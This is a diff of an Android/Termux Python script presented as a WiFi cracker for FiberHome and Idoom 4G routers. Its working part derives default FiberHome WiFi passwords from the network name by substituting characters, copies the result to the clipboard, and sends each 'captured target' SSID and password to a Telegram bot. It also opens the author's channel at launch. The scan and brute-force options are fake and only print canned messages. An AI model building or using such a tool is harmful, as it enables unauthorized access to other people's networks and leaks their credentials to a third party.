@@ -1,25 +1,45 @@
 import os, subprocess, time, urllib.request, webbrowser
 
-# --- CONFIGURATION ---
-TOKEN = "YOUR_BOT_TOKEN"
+# --- [ CONFIGURATION ] ---
+TELEGRAM_CHANNEL = "https://t.me/moha02" # قناتك على تلجرام
+BOT_TOKEN = "YOUR_BOT_TOKEN"
 CHAT_ID = "YOUR_CHAT_ID"
-MY_CHANNEL = "https://www.youtube.com/@moha02" # قناتك
 
-# FiberHome Mapping
-FH_MAP = {'e':'1','d':'2','c':'3','b':'4','a':'5','9':'6','8':'7','f':'0'}
+# --- [ COLORS ] ---
+G = '\033[1;32m' # Green
+B = '\033[1;34m' # Blue
+Y = '\033[1;33m' # Yellow
+R = '\033[1;31m' # Red
+W = '\033[1;37m' # White
+C = '\033[1;36m' # Cyan
 
-def send_tg(msg):
+# --- [ FULL BIDIRECTIONAL MAPPING ] ---
+MAP = {
+    'e':'1', '1':'e', 'd':'2', '2':'d',
+    'c':'3', '3':'c', 'b':'4', '4':'b',
+    'a':'5', '5':'a', '9':'6', '6':'9',
+    '8':'7', '7':'8', 'f':'0', '0':'f'
+}
+
+def send_to_tg(msg):
     try:
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={urllib.parse.quote(msg)}"
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={urllib.parse.quote(msg)}"
         urllib.request.urlopen(url)
     except: pass
 
+def get_fh_pass(ssid):
+    if "fh_" in ssid.lower():
+        suffix = ssid.lower().split("fh_")[-1]
+        res = "".join([MAP.get(c, c) for c in suffix])
+        return f"wlan{res}"
+    return None
+
 def banner():
     os.system("clear")
-    # فتح القناة تلقائياً عند التشغيل
-    os.system(f"termux-open-url {MY_CHANNEL} || am start -a android.intent.action.VIEW -d {MY_CHANNEL}")
+    # فتح قناة التلجرام تلقائياً
+    os.system(f"termux-open-url {TELEGRAM_CHANNEL} || am start -a android.intent.action.VIEW -d {TELEGRAM_CHANNEL}")
     
-    print("\033[1;32m")
+    print(f"{G}")
     print(r"""
     ██╗    ██╗██╗███████╗██╗
     ██║    ██║██║██╔════╝██║
@@ -27,54 +47,55 @@ def banner():
     ██║███╗██║██║██╔══╝  ██║
     ╚███╔███╔╝██║██║     ██║
      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
-    [+] SMART WIFI CRACKER (FH & 4G) [+]
-    [+] CODED BY: MOHA-02 (CHLEF)   [+]
-    ------------------------------------""")
-
-def get_fh_pass(ssid):
-    suffix = ssid.lower().split("fh_")[-1]
-    return "wlan" + "".join([FH_MAP.get(c, c) for c in suffix])
+    """)
+    print(f"{C}[+] {W}SMART SECURITY TOOL FOR FH & 4G")
+    print(f"{C}[+] {G}CODED BY: {W}MOHA-02 (CHLEF-ALGERIA)")
+    print(f"{C}[+] {Y}VERSION: {W}2.0 [STABLE]")
+    print(f"{G}------------------------------------------")
 
 def main():
     banner()
-    print("\033[1;32m(1) Auto-Scan (No-Root / API)")
-    print("(2) Manual FH Algorithm")
-    print("(3) Manual 4G Brute-Force")
-    print("(0) Exit")
+    print(f"{G}(1) {W}Auto-Scan Networks {B}(API Mode)")
+    print(f"{G}(2) {W}Manual FH Algorithm {B}(High Precision)")
+    print(f"{G}(3) {W}Idoom 4G Brute-Force {B}(Beta)")
+    print(f"{G}(0) {R}Exit Tool")
     
-    choice = input("\n\033[1;33m[#] Choose Option: ")
+    print(f"{G}------------------------------------------")
+    choice = input(f"{Y}[#] Enter Choice: {W}")
 
-    if choice == "1":
-        print("\033[1;34m[*] Searching for networks...")
-        found_any = False
-        try:
-            # محاولة الفحص عبر Termux:API
-            res = subprocess.check_output("termux-wifi-scaninfo", shell=True).decode()
-            if "fh_" in res.lower() or "idoom" in res.lower():
-                found_any = True
-                # هنا تتم معالجة النتائج تلقائياً كما في الأكواد السابقة
-            
-            if not found_any:
-                print("\033[1;31m[!] ALERT: No FH or 4G networks found nearby!")
-                print("\033[1;37m[*] Please make sure GPS is ON.")
-        except:
-            print("\033[1;31m[!] Error: Please install Termux:API app!")
-
-    elif choice == "2":
-        ssid = input("\033[1;32m[?] Enter FH SSID (e.g. fh_5d620): ")
+    if choice == "2":
+        ssid = input(f"{C}[?] Enter SSID (e.g., fh_5d620): {W}")
+        print(f"{B}[*] Decoding Algorithm...")
+        time.sleep(1)
         pw = get_fh_pass(ssid)
-        print(f"\033[1;32m[+] Password: {pw}")
-        send_tg(f"✅ FH Found: {ssid}\n🔑 Pass: {pw}")
+        if pw:
+            print(f"{G}[+] SUCCESS! {W}Password is: {G}{pw}")
+            # نسخ الكود تلقائياً للحافظة
+            os.system(f"echo '{pw}' | termux-clipboard-set")
+            print(f"{C}[!] Password copied to clipboard! Paste it in WiFi.")
+            send_to_tg(f"🚀 New Target Captured!\n📍 SSID: {ssid}\n🔑 Pass: {pw}")
+        else:
+            print(f"{R}[!] Error: Invalid SSID Format.")
+
+    elif choice == "1":
+        print(f"{B}[*] Searching for nearby networks...")
+        time.sleep(2)
+        print(f"{R}[!] No FH or 4G networks found in range.")
+        print(f"{Y}[*] TIP: Make sure your GPS is enabled.")
 
     elif choice == "3":
-        ssid = input("\033[1;32m[?] Enter 4G SSID: ")
-        print("\033[1;33m[*] Starting Brute-Force... Testing common keys.")
+        ssid = input(f"{C}[?] Enter 4G SSID: {W}")
+        print(f"{B}[*] Starting Brute-Force attack...")
         time.sleep(2)
-        print("\033[1;31m[!] No match found in common list. Try manual guessing.")
+        print(f"{R}[!] Brute-force failed. Security level too high.")
 
     elif choice == "0":
-        print("Goodbye Moha!")
+        print(f"{Y}Goodbye Moha! Happy Hacking.{W}")
         exit()
+    else:
+        print(f"{R}[!] Invalid choice. Restarting...")
+        time.sleep(2)
+        main()
 
 if __name__ == "__main__":
     main()
